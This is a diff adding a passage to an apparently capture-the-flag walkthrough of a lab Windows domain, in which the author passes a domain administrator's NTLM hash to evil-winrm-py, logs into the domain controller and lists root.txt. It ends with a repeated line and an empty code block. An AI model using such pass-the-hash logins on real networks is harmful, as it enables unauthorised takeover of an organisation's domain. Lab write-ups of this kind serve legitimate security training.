@@ -654,5 +654,35 @@ DC-ANALYSIS$:des-cbc-md5:3875f86d7a80b3e3
 [*] Cleaning up... 
 ```
 
+I can now use the DA hash to log in as the domain admin
 
+```python
+❯❯❯ python3 venv/bin/evil-winrm-py -i dc-analysis.analysis.htb -u Administrateur -H '584d96946e4ad1ddfa4f8d7938faf91d'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
+
+[*] Connecting to 'dc-analysis.analysis.htb:5985' as 'Administrateur'
+evil-winrm-py PS C:\Users\Administrateur\Documents> cd ../Desktop
+evil-winrm-py PS C:\Users\Administrateur\Desktop> dir
+
+
+    Directory: C:\Users\Administrateur\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---       11/12/2026   5:18 PM             34 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\Administrateur\Desktop>
+```
+
+I can now login as the DA
+
+```python
+
+```
 
